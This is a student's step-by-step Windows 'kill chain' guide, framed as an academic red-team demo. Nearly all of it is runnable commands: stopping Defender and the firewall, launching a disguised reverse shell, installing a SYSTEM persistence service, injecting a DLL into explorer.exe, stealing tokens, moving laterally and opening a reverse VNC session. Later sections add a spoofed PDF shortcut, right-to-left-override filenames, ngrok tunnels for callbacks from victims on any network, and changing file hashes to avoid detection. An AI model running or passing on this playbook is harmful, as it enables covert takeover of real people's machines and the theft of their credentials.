# CSEC Final — Complete Kill Chain Guide

**Author:** George Wu
**Assessment:** 22603VIC Cyber Security Final Demonstration
**Classification:** Academic red-team demonstration — isolated lab environment only

---

## Table of Contents

1. [Pre-Flight Checklist](#1-pre-flight-checklist)
2. [Part A — TEST Chain (Localhost / Disposable)](#2-part-a--test-chain-localhost--disposable)
3. [Part B — REAL Chain (Machine-to-Machine / Demo Day)](#3-part-b--real-chain-machine-to-machine--demo-day)
4. [Part C — VNC Remote Desktop Setup](#4-part-c--vnc-remote-desktop-setup)
5. [Part D — Troubleshooting](#5-part-d--troubleshooting)
6. [Part E — Cleanup & Rollback](#6-part-e--cleanup--rollback)
7. [Appendix — File Manifest](#7-appendix--file-manifest)

---

## 1. Pre-Flight Checklist

### Host Machine (Your Laptop)
- [ ] Connected to classroom WiFi/LAN
- [ ] Know your IP: `ipconfig` -> look for WiFi adapter IPv4
- [ ] `tvnviewer.exe -listen` ready for VNC
- [ ] C2 shell listener ready (Python `nc` or custom script)

### Victim Machine (Classroom Target)
- [ ] Physical Windows machine, reformatted
- [ ] Internet connected
- [ ] You have local Administrator credentials
- [ ] Tamper Protection verified OFF
- [ ] Files copied to staging directory

### Verify Tamper Protection
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection
```
If value is `0x1`, Defender services can be stopped. If `0x5`, evasion will fail — skip to Silent Chain (TokenVault only).

---

## 2. Part A — TEST Chain (Localhost / Disposable)

**Purpose:** Verify every binary works without burning originals. Uses `*_test.exe` variants. All traffic stays on localhost.

**Staging Directory:** `C:\Windows\Temp\test\`

### Step A1 — Stage Test Files

On **victim**, create staging folder and copy test binaries:
```cmd
mkdir C:\Windows\Temp\test
```
Copy these files into it:
- `spoolsv_test.exe`
- `svchost_update_test.exe`
- `SecurityHealthHost_test.exe`
- `Injector_test.exe`
- `payload_test.dll`
- `TokenVault_test.exe`
- `NetExec_test.exe`
- `vncserver.exe`

### Step A2 — Start Local Listeners

**Terminal 1** (Python shell listener for localhost test):
```cmd
python -c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',9999));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])"
```

**Terminal 2** (VNC viewer listener — optional for local test):
```cmd
cd "C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission\VNC\TightVNCViewerPortable"
tvnviewer.exe -listen
```

### Step A3 — Phase 1: Evasion (Defender Stop)

**Right-click -> Run as Administrator:**
```cmd
cd C:\Windows\Temp\test
svchost_update_test.exe
```

Click **"This program installed correctly"** on the PCA nag dialog.

**Verify:**
```cmd
sc query WinDefend | findstr "STATE"
sc query WdNisSvc | findstr "STATE"
```
Expected: `STATE: 1  STOPPED`

### Step A4 — Phase 2: Foothold (Reverse Shell)

```cmd
cd C:\Windows\Temp\test
spoolsv_test.exe
```

**Verify:** Check Terminal 1 — a `cmd.exe` prompt should appear in the Python listener.

Type `whoami` in the listener to confirm shell works.

**Kill shell after test:**
```cmd
taskkill /F /IM cmd.exe
```

### Step A5 — Phase 3: Persistence (SYSTEM Service)

**Run as Administrator:**
```cmd
cd C:\Windows\Temp\test
SecurityHealthHost_test.exe install
net start HealthSecurityHost
```

**Verify:**
```cmd
sc query HealthSecurityHost | findstr "STATE"
```
Expected: `STATE: 4  RUNNING`

Check proof file:
```cmd
type phantom_alive.txt
```

### Step A6 — Phase 4: Injection (Memory Resident)

**Open Notepad** (test injector targets `notepad.exe`):
```cmd
notepad.exe
```

**Run as Administrator:**
```cmd
cd C:\Windows\Temp\test
Injector_test.exe C:\Windows\Temp\test\payload_test.dll
```

**Verify:**
```cmd
type C:\Windows\Temp\module_proof.txt
```
Expected: `Module loaded into notepad.exe successfully.`

### Step A7 — Phase 5: Credential Access (Token Theft)

**Run as Administrator:**
```cmd
cd C:\Windows\Temp\test
TokenVault_test.exe
```

**Verify:**
```cmd
type C:\Windows\Temp\phantom_proof.txt
```
Expected: `PhantomVault SYSTEM proof`

`RegSaveKey` may fail with an error — this is normal on hardened builds. Token theft still succeeded.

### Step A8 — Phase 6: Lateral Movement (NetExec)

**If you have a second machine:**
```cmd
cd C:\Windows\Temp\test
NetExec_test.exe 192.168.X.Y Administrator Password C:\Windows\Temp\test\spoolsv_test.exe
```

**If no second machine (localhost code-path test):**
```cmd
NetExec_test.exe 127.0.0.1 <your_username> <your_password> C:\Windows\Temp\test\spoolsv_test.exe
```
Expected: Auth succeeds, `CreateService` fails (localhost restriction). This proves the binary logic works.

### Step A9 — Phase 7: VNC Callback

**On victim:**
```cmd
cd C:\Windows\Temp\test
vncserver.exe -run
```
Tray icon appears. Leave running.

**In a new terminal on victim:**
```cmd
vncserver.exe -controlapp -connect 127.0.0.1
```

**Verify:** Check Terminal 2 — `tvnviewer.exe` should show a VNC window (connecting to itself, so it shows your own desktop).

---

## 3. Part B — REAL Chain (Machine-to-Machine / Demo Day)

**Purpose:** Full demonstration for the class. Uses original binaries. Machine-to-machine over classroom LAN. Internet connected.

**WARNING:** These are the pristine originals. If they get cloud-submitted to Microsoft during the demo, the hashes are burned. Keep the demo brief. Have a USB backup with mutated variants ready.

**Staging Directory:** `C:\Windows\Temp\c2\`

**Host IP:** `192.168.1.92` (placeholder — verify YOUR host IP with `ipconfig` before demo)
**Shell Port:** `8080`
**VNC Port:** `5500`

### Step B0 — Verify Host IP

On **host** laptop:
```cmd
ipconfig
```
Note your WiFi adapter IPv4 address (e.g., `192.168.1.92`).

If your IP is different, **all commands below must use YOUR actual IP**, not `192.168.1.92`.

### Step B1 — Stage Real Files on Victim

On **victim**, create staging folder:
```cmd
mkdir C:\Windows\Temp\c2
```
Copy from USB:
- `spoolsv.exe`
- `svchost_update.exe`
- `SecurityHealthHost.exe`
- `Injector.exe`
- `payload.dll`
- `TokenVault.exe`
- `NetExec.exe`
- `vncserver.exe`

### Step B2 — Start Host Listeners

**On HOST laptop, Terminal 1** (Shell listener on port 8080):
```cmd
python -c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',8080));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])"
```

**On HOST laptop, Terminal 2** (VNC viewer listening):
```cmd
cd "C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission\VNC\TightVNCViewerPortable"
tvnviewer.exe -listen
```

**Verify both ports are listening:**
```cmd
netstat -an | findstr "8080"
netstat -an | findstr "5500"
```

### Step B3 — Phase 1: Evasion (Defender Stop)

**On VICTIM, Right-click -> Run as Administrator:**
```cmd
cd C:\Windows\Temp\c2
svchost_update.exe
```

Click **"This program installed correctly"** on PCA dialog.

**Verify:**
```cmd
sc query WinDefend | findstr "STATE"
```
Expected: `1  STOPPED`

### Step B4 — Phase 2: Foothold (Live C2)

**On VICTIM:**
```cmd
cd C:\Windows\Temp\c2
spoolsv.exe
```

**Verify on HOST Terminal 1:** `cmd.exe` prompt appears. Type `whoami`.

### Step B5 — Phase 3: Persistence (Auto-Start SYSTEM Service)

**On VICTIM, as Administrator:**
```cmd
cd C:\Windows\Temp\c2
SecurityHealthHost.exe install
net start SecurityHealthHost
```

**Verify:**
```cmd
sc query SecurityHealthHost | findstr "STATE"
```
Expected: `4  RUNNING`

This service **auto-launches** `spoolsv.exe` and VNC on every boot.

### Step B6 — Phase 4: Injection (Trusted Process)

**On VICTIM, ensure `explorer.exe` is running** (it always is).

**Run as Administrator:**
```cmd
cd C:\Windows\Temp\c2
Injector.exe C:\Windows\Temp\c2\payload.dll
```

**Verify:** No new process visible in Task Manager. The DLL lives inside `explorer.exe` memory.

### Step B7 — Phase 5: Credential Access (SYSTEM Token)

**On VICTIM, as Administrator:**
```cmd
cd C:\Windows\Temp\c2
TokenVault.exe
```

**Verify:**
```cmd
type C:\Windows\Temp\phantom_proof.txt
```
Expected: `TokenVault SYSTEM proof`

### Step B8 — Phase 6: Lateral Movement (NetExec)

**On VICTIM, as Administrator** (if second classroom machine available):
```cmd
cd C:\Windows\Temp\c2
NetExec.exe 192.168.1.X Administrator <password> C:\Windows\Temp\c2\spoolsv.exe
```

### Step B9 — Phase 7: VNC Remote Desktop (The Finale)

**On VICTIM:**
```cmd
cd C:\Windows\Temp\c2
vncserver.exe -run
```

**In a new terminal on VICTIM:**
```cmd
vncserver.exe -controlapp -connect 192.168.1.92
```

**On HOST:** `tvnviewer.exe` window pops up showing the victim's live desktop.

**You now have full GUI remote control.**

---

## 4. Part C — VNC Remote Desktop Setup

### TightVNC Reverse Connection Explained

TightVNC uses a **reverse connection** model:
1. **Viewer** (host) listens on port 5500
2. **Server** (victim) connects **back** to the viewer
3. The viewer window pops up automatically when the server connects

### Viewer (Host)
```cmd
tvnviewer.exe -listen
```
Listens on `0.0.0.0:5500`. Waits for incoming reverse connection.

### Server (Victim)
```cmd
vncserver.exe -run                    # Start server in app mode
vncserver.exe -controlapp -connect <HOST_IP>   # Connect back to viewer
```

### Common VNC Errors

| Error | Cause | Fix |
|-------|-------|-----|
| Help dialog pops up | Bad syntax | Use `-controlapp -connect <IP>`, not `-connect` alone |
| "Connection lost" | Viewer not listening | Start `tvnviewer.exe -listen` first |
| Black screen | Server running but no session | Make sure user is logged in on victim |
| Connection refused | Firewall blocking 5500 | Disable firewall: `netsh advfirewall set allprofiles state off` |

---

## 5. Part D — Troubleshooting

### "This program might not have installed correctly" (PCA Dialog)
**Cause:** Filename contains "update" or binary writes to protected paths.
**Fix:** Click **"This program installed correctly"**. It is NOT a detection.

### `sc query WinDefend` shows RUNNING after evasion
**Cause:** Not running as Administrator, or Tamper Protection is actually ON.
**Fix:** Right-click -> Run as Administrator. If still running, switch to Silent Chain (skip evasion, use TokenVault only).

### Injection fails with `CreateRemoteThread` error 5
**Cause:** Access denied — target process is protected or injector lacks privileges.
**Fix:** Run injector as Administrator. Try injecting into `explorer.exe` instead of `notepad.exe`.

### Reverse shell doesn't connect
**Cause:** Windows Firewall blocking outbound, or listener not running.
**Fix:** Disable firewall on victim: `netsh advfirewall set allprofiles state off`. Verify listener is running on host.

### VNC viewer never pops up
**Cause:** Wrong IP, port blocked, or server not started.
**Fix:** Verify host IP with `ipconfig`. Ensure `tvnviewer.exe -listen` is running before victim connects.

### NetExec auth fails with 1208
**Cause:** Localhost loopback protection, or wrong credentials.
**Fix:** Test against a real second machine. `WNetAddConnection2` to `\127.0.0.1\IPC$` is blocked by Windows design.

---

## 6. Part E — Cleanup & Rollback

### Immediate Cleanup (After Demo)

```cmd
:: Stop persistence service
sc stop SecurityHealthHost
sc delete SecurityHealthHost

:: Remove test services (if any left over)
sc delete HealthSecurityHost
sc delete WinDefendUpdate
sc delete UpdateDefendWin

:: Delete staging directories
rmdir /s /q C:\Windows\Temp\test
rmdir /s /q C:\Windows\Temp\c2

:: Delete proof files
del C:\Windows\Temp\phantom_proof.txt
del C:\Windows\Temp\module_proof.txt
del C:\Windows\Temp\test_status.txt
del "C:\ProgramData\Microsoft\Windows\Caches\sysmon.log"

:: Restart Defender
sc start WinDefend
sc start WdNisSvc
sc start Sense
sc start WdBoot

:: Re-enable firewall
netsh advfirewall set allprofiles state on

:: Kill any leftover processes
taskkill /F /IM cmd.exe 2>nul
taskkill /F /IM vncserver.exe 2>nul
```

### USB Sanitization
If originals were burned (hash-detected by Microsoft):
1. Delete detected files from USB
2. Reformat: `format F: /FS:exFAT /Q`
3. Copy new mutated variants from `TEST\BINARIES\`
4. Never run originals on internet-connected machines again

---

## 7. Appendix — File Manifest

### USB Contents (Demo Day Payload)

| File | Size | Purpose |
|------|------|---------|
| `spoolsv.exe` | ~104 KB | Reverse TCP shell (foothold) |
| `svchost_update.exe` | ~111 KB | Defense evasion (stops Defender) |
| `SecurityHealthHost.exe` | ~145 KB | Persistence service (auto-start SYSTEM) |
| `Injector.exe` | ~142 KB | Reflective DLL injector |
| `payload.dll` | ~104 KB | Second-stage payload DLL |
| `NetExec.exe` | ~145 KB | Lateral movement (remote SCM) |
| `TokenVault.exe` | ~143 KB | Token theft / SYSTEM impersonation |
| `vncserver.exe` | ~1,834 KB | TightVNC Server (reverse desktop) |

### Directory Structure

```
C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission\
├── ORIGINALS\              <- Pristine sources and binaries (NEVER run online)
│   ├── BINARIES\
│   └── SOURCES\
├── TEST\                   <- Disposable test variants
│   ├── BINARIES\*_test.exe
│   └── SOURCES\*_test.c
├── DEMO\                   <- Real demo binaries (machine-to-machine)
│   ├── BINARIES\
│   └── SOURCES\
├── USB\                    <- What goes on the USB stick
├── VNC\                    <- tvnserver.exe + viewer portable
└── STAGING\               <- Legacy mutated/burned tools
```

### Hash Verification

All `*_test.exe` variants have **different SHA256 hashes** from their originals. If an original is burned, mutate one string in the `.c` source, recompile, and the new hash is clean.

---

## Quick Reference Card

```
EVASION:     svchost_update.exe          (Run as Admin)
FOOTHOLD:    spoolsv.exe                 (Connects to host:8080)
PERSIST:     SecurityHealthHost install  (Auto-start SYSTEM)
INJECT:      Injector.exe payload.dll    (Into explorer.exe)
CREDS:       TokenVault.exe              (SYSTEM token theft)
LATERAL:     NetExec.exe <IP> <user> <pass> <payload>
VNC:         vncserver.exe -run
             vncserver.exe -controlapp -connect <HOST_IP>
VIEWER:      tvnviewer.exe -listen      (On host)
```

**Generated:** 2026-05-31
**Compiler:** MSVC 14.51 (cl.exe 19.51) x64
**Target:** Windows 10/11 x64


---

## 8. Part F — Automated Deployment (AutoChain.ps1)

Instead of running each binary manually, use `AutoChain.ps1` to execute the entire kill chain with a single command.

### Prerequisites
- PowerShell execution policy must allow scripts: `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process`
- Run as Administrator
- USB drive containing all binaries plugged in

### Usage

```powershell
# Auto-detect USB and use default host IP
.\AutoChain.ps1

# Specify host IP and USB path explicitly
.\AutoChain.ps1 -HostIP 192.168.1.92 -USBPath D:\

# Skip evasion (if Tamper Protection is ON)
.\AutoChain.ps1 -HostIP 192.168.1.92 -SkipEvasion
```

### What It Does

1. **Validates admin privileges** — stops if not elevated
2. **Auto-detects USB** — searches removable drives for `spoolsv.exe`
3. **Creates staging directory** — `C:\Windows\Temp\c2\` (hidden)
4. **Copies binaries** from USB to staging
5. **Phase 1: Evasion** — runs `svchost_update.exe`, verifies Defender stopped
6. **Phase 2: Foothold** — launches `spoolsv.exe` in background
7. **Phase 3: Persistence** — installs and starts `SecurityHealthHost` service
8. **Phase 4: Injection** — injects `payload.dll` into `explorer.exe`
9. **Phase 5: TokenVault** — steals SYSTEM token, writes proof
10. **Phase 6: Lateral Movement** — prints manual command (requires second machine)
11. **Phase 7: VNC** — starts `vncserver.exe` and connects back to host

### Error Handling

The script uses color-coded output:
- `[*]` Cyan — Information
- `[+]` Green — Success
- `[-]` Red — Error (halts chain unless `-ContinueOnError`)
- `[!]` Yellow — Warning

If any critical phase fails, the script throws an error and stops. Check the output to see exactly which phase failed.

---

## 9. Part G — Social Engineering Delivery (Spoofed Shortcut)

For the demo, you can deliver the payload via a convincing shortcut that looks like a PDF document.

### Method 1: LNK Shortcut with PDF Icon

Run `Create-SpoofedShortcut.ps1`:

```powershell
.\Create-SpoofedShortcut.ps1 -HostIP 192.168.1.92 -OutputPath "C:\Users\Student\Desktop"
```

This creates `CSEC_Assignment_Requirements.lnk` on the victim's desktop with:
- A **PDF document icon**
- Innocuous description: "CSEC Final Assignment Requirements — PDF Document"
- Hidden PowerShell execution of `AutoChain.ps1`

**Visual appearance:** The victim sees a PDF icon labeled `CSEC_Assignment_Requirements`. When double-clicked, it silently runs the entire kill chain in the background.

### Method 2: RTL Extension Spoof (Advanced)

Use the Unicode Right-to-Left Override character (U+202E) to flip the filename display:

```powershell
# Create an executable that displays as "Assignment.pdf" but is actually .exe
$spoofedName = "CSEC_Assignment" + [char]0x202E + "fdp.exe"
Copy-Item spoolsv.exe $spoofedName
```

Windows Explorer displays: `CSEC_Assignment.exe.pdf`
Actual file: `CSEC_Assignment‮fdp.exe` (executable)

**Limitation:** Windows 10/11 shows file extensions by default unless the user has manually hidden them. The LNK method (Method 1) is more reliable.

### Recommendation

Use **Method 1 (LNK shortcut)** for the class demo. It is:
- More reliable across Windows versions
- Does not require compiling anything new
- Easy to customize with any icon
- Leaves no suspicious .exe on the desktop

---

## 10. Part H — Customizing Host IP Before Demo

The binaries are compiled with `192.168.1.92` as the default C2 host IP. **You MUST verify and update this** before each demo.

### Step 1: Find Your Host IP

On your **host laptop**:
```cmd
ipconfig
```

Look for your active WiFi or Ethernet adapter:
```
Wireless LAN adapter Wi-Fi:
   IPv4 Address. . . . . . . . . . . : 192.168.1.92
```

### Step 2: If IP Matches (192.168.1.92)

No changes needed. The binaries will connect to the correct IP.

### Step 3: If IP is Different

You have **three options**:

#### Option A: Recompile (Recommended for class demo)

Edit `ORIGINALS/SOURCES/shadow_shell.c`:
```c
#define LISTENER_IP   "YOUR.ACTUAL.IP.HERE"
```

Then recompile:
```cmd
cd C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission\ORIGINALS\SOURCES
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvarsall.bat" x64
cl.exe shadow_shell.c /Fe:..\BINARIES\spoolsv.exe /O1 /GS- ws2_32.lib
```

Copy the new `spoolsv.exe` to `USB/` and restage.

#### Option B: Use AutoChain.ps1 (No Recompile Needed)

`AutoChain.ps1` accepts `-HostIP` as a parameter. However, the **foothold binary still has the old IP hardcoded**. This option only works if you also update the VNC connection command.

#### Option C: Static IP Assignment (Most Reliable)

Configure your host laptop to use a **static IP** that matches the binary:
```
IP:      192.168.1.92
Subnet:  255.255.255.0
Gateway: 192.168.1.1
```

This guarantees the binary always connects to the right address without recompilation.

**For the class demo, Option A (recompile with correct IP) or Option C (static IP) is recommended.**

---

## 11. Part I — Parrot VM Setup (Alternative Target)

If you want to demo against the `C1_Parrot` VM instead of the physical class machine:

### VM Network Configuration

1. Open **VirtualBox Manager**
2. Select `C1_Parrot` → **Settings** → **Network**
3. Adapter 1: **Host-only Adapter** → `vboxnet0`
4. Ensure `vboxnet0` is configured: **File** → **Host Network Manager**
   - IPv4 Address: `192.168.56.1`
   - IPv4 Network Mask: `255.255.255.0`

### Host IP on Host-Only Network

Your host laptop has two IPs:
- Classroom WiFi: `192.168.1.X` (for physical machine demo)
- Host-only adapter: `192.168.56.1` (for VM demo)

### Recompiling for VM

Edit `ORIGINALS/SOURCES/shadow_shell.c`:
```c
#define LISTENER_IP   "192.168.56.1"
#define LISTENER_PORT 4444
```

Recompile and copy to VM via shared folder or USB.

### VM Execution Differences

The VM runs **Parrot OS (Linux)**, not Windows. You **cannot** run Windows `.exe` files directly on Parrot.

**For a Windows VM target instead:**
1. Create a new Windows 10 VM in VirtualBox
2. Set network to **Host-only Adapter** (`vboxnet0`)
3. Install Windows, create admin account
4. Copy binaries to VM via shared folder
5. Execute the chain exactly as described in Part B

**The `C1_Parrot` VM is only useful as an attacker box** (running Kali/Parrot tools). For the kill chain demo, you need a **Windows victim** — either the physical class machine or a Windows VM.

---

## 12. Part J — Quick Reference (All Commands)

### Manual Chain (One by One)
```cmd
:: Evasion
svchost_update.exe

:: Foothold
spoolsv.exe

:: Persistence
SecurityHealthHost.exe install
net start SecurityHealthHost

:: Injection
Injector.exe C:\Windows\Temp\c2\payload.dll

:: Token Theft
TokenVault.exe

:: VNC
vncserver.exe -run
vncserver.exe -controlapp -connect <HOST_IP>
```

### Automated Chain (Single Command)
```powershell
.\AutoChain.ps1 -HostIP 192.168.1.92
```

### Spoofed Delivery
```powershell
.\Create-SpoofedShortcut.ps1 -HostIP 192.168.1.92
```

### Host Listener Setup
```cmd
:: Shell listener (port 8080)
python -c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',8080));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])"

:: VNC listener (port 5500)
tvnviewer.exe -listen
```

---

*Guide updated: 2026-05-31 — Added automation, spoofed delivery, IP customization, and VM setup sections.*

---

## Cross-Network Operation

For demos where the victim is on a **different network** (teacher's hotspot, home WiFi, cafe), see:

**CROSS_NETWORK_GUIDE.md**

- ngrok tunneling (recommended)
- Serveo (no signup)
- Port forwarding
- Cloud VPS

This enables true internet-wide callbacks without Evil Twin.

---

## Part F — Cross-Network / Internet-Wide Callbacks (NEW)

### When to Use Cross-Network Mode

Use cross-network callbacks when:
- The victim is on a **different WiFi network** (teacher's hotspot, classroom WiFi)
- The victim is at **home** and you are connecting remotely
- You want to demonstrate that **network boundaries do not stop the attack**
- You want the most **impressive reveal** — control from anywhere

### Cross-Network Architecture

`
[Victim Anywhere] ──► [Internet] ──► [ngrok Edge] ──► [Your Laptop]
     (Any WiFi)         (TCP)         (Tunnel)        (Listener)
`

The victim connects to a **public endpoint** (e.g.,  .tcp.ngrok.io:12345). ngrok forwards the traffic through an encrypted tunnel to your laptop. You do not need to know the victim's IP. You do not need to be on their network.

### Step-by-Step Cross-Network Setup

**1. Start ngrok Tunnels (Operator)**
`powershell
cd C:\Users\gwu07\Desktop\CSEC\CSEC_Final_Submission
.\Setup-NgrokC2.ps1 -NgrokPath C:\Tools\ngrok.exe -AuthToken YOUR_TOKEN
`
Note the public endpoints from the output.

**2. Compile Cross-Network Binary**
`cmd
cd ORIGINALS\SOURCES
notepad shadow_shell_ngrok.c
# Change: #define C2_ENDPOINT "0.tcp.ngrok.io:12345"
cl.exe shadow_shell_ngrok.c /Fe:spoolsv_ngrok.exe /O1 /GS- ws2_32.lib
`

**3. Deploy to Victim (Any Network)**
Copy spoolsv_ngrok.exe to USB. Victim runs it. No network configuration needed on their side.

**4. Catch the Shell**
Your listener receives the connection via ngrok tunnel. Operate normally.

**5. VNC Over Internet**
`cmd
# On victim (any network)
vncserver.exe -run
vncserver.exe -controlapp -connect 8.tcp.ngrok.io:67890
`

### Cross-Network vs LAN Comparison

| Aspect | LAN Mode | Cross-Network Mode |
|--------|----------|-------------------|
| Victim network | Must be same network | Any network |
| C2 IP | Private IP (192.168.x.x) | Public hostname (ngrok) |
| Setup complexity | Low | Medium |
| Impressiveness | High | **Very High** |
| Internet required | No | Yes (victim side) |
| Cloud submission risk | Low | Higher |

### Important Warnings

1. **Cloud Submission:** When the victim has internet, Defender can upload unknown samples to Microsoft. Use test variants or run evasion first.
2. **ngrok Timeout:** Free tier tunnels may disconnect after ~1 minute of inactivity. Keep the shell active.
3. **Endpoint Rotation:** ngrok free tier assigns random endpoints each session. Recompile with the new endpoint before each demo.

### Full Documentation

See CROSS_NETWORK_GUIDE.md for:
- ngrok deep-dive (architecture, free tier limits, automation)
- Serveo (SSH tunneling, no signup)
- Port forwarding (if you have a public IP)
- Cloud VPS setup (/month DigitalOcean/Linode)
- Cloudflare Tunnel (custom domains, free)
- Troubleshooting guide
- Multi-hop tunneling for maximum OPSEC

---

## Part G — Documentation Reference

### CODE_DOCS (Line-by-Line Code Explanation)

| Document | What It Covers |
|----------|---------------|
| c_programming_primer.md | C basics, pointers, structures, compilation |
| 
etworking_concepts.md | TCP/IP, sockets, reverse shells, VNC, tunneling |
| windows_internals.md **NEW** | PE format, processes, threads, memory, tokens, registry, services |
| process_injection_theory.md **NEW** | DLL injection, reflective DLL, process hollowing, APC, thread hijacking |
| opsec_tradecraft.md **NEW** | Anti-forensics, anti-analysis, OPSEC, counter-surveillance, burn protocol |
| compilation_advanced.md **NEW** | cl.exe flags, optimization, linking, stripping, build automation, resource files |
| shadow_shell.md | Reverse shell source walkthrough |
| shadow_evasion.md | Evasion module source walkthrough |
| ghost_svc.md | Persistence service source walkthrough |
| injector.md | DLL injector source walkthrough |
| payload_dll.md | Payload DLL source walkthrough |
| shadow_lateral.md | Lateral movement source walkthrough |
| shadow_token.md | Token theft source walkthrough |

### Operational Guides

| Document | Purpose |
|----------|---------|
| CSEC_KillChain_Guide.md | This file — complete testing and demo procedures |
| CROSS_NETWORK_GUIDE.md | Internet-wide callbacks via tunneling |
| ASF_Social_Engineering_Guide.md | ASF doctrine, pretexts, body language, reveal scripts |

---

*Guide updated: 2026-05-31 — Added Part F (Cross-Network callbacks), Part G (Documentation Reference), and references to new CODE_DOCS pages.*
